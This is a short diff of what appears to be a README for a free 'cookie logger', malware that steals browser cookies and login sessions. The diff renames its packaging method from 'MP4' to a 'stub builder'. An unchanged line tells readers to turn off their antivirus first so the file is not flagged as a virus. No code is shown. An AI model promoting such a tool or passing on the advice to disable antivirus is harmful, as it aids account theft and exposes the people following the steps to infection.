@@ -1,4 +1,4 @@
-# This Is The Best Free Cookie Logger That Uses MP4
+# This Is The Best Free Cookie Logger That Uses A Stub Builder
 
 # Before The Steps Turn Off Antivirus Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus Something Like That
 
